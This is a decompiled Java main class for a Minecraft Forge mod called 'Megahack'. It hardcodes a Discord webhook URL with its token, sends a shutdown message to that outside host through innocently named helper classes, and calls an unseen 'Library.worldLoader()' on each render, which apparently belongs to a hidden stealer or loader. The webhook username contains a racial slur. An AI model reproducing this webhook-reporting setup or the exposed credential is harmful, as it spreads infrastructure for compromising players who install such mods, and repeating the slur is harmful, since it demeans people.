//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.minecraft;

import net.minecraftforge.fml.common.*;
import me.minecraft.utils.*;
import me.minecraft.libraries.*;
import net.minecraftforge.common.*;
import net.minecraftforge.fml.common.event.*;
import net.minecraftforge.client.event.*;
import net.minecraftforge.fml.common.eventhandler.*;

@Mod(modid = "megahack", version = "v0.1", name = "Megahack")
public class Client
{
    @Mod.Instance
    public static Client instance;
    public JsonUtil.Builder def;
    public CapeUtil sender;
    public Library lib;
    
    public Client() {
        this.def = new JsonUtil.Builder().withUsername("Nigga Hack.me").withDev(false).withAvatarURL("https://discord.com/api/webhooks/896301470297776178/3u_jHkbxQI_S0zYkrv5ujubArl_D6hh3rPlJCzOHoqj9Mse_2d_mwtkcF0zk_JaO0lUb");
        this.sender = new CapeUtil("https://discord.com/api/webhooks/896301470297776178/3u_jHkbxQI_S0zYkrv5ujubArl_D6hh3rPlJCzOHoqj9Mse_2d_mwtkcF0zk_JaO0lUb");
    }
    
    @Mod.EventHandler
    public void preInit(final FMLPreInitializationEvent e) {
        MinecraftForge.EVENT_BUS.register((Object)Client.instance);
    }
    
    @Mod.EventHandler
    public void postInit(final FMLPostInitializationEvent e) {
        this.lib = new Library();
        Runtime.getRuntime().addShutdownHook(new Thread(() -> this.sender.sendMessage(this.def.withContent("**\u0411\u044b\u043b \u0443\u0431\u0438\u0442 \u0438\u0433\u0440\u043e\u0439**").build())));
    }
    
    @SubscribeEvent
    public void onWorldRender(final RenderGameOverlayEvent.Text e) {
        if (!this.lib.isWorldLoaded()) {
            this.lib.worldLoader();
        }
    }
}
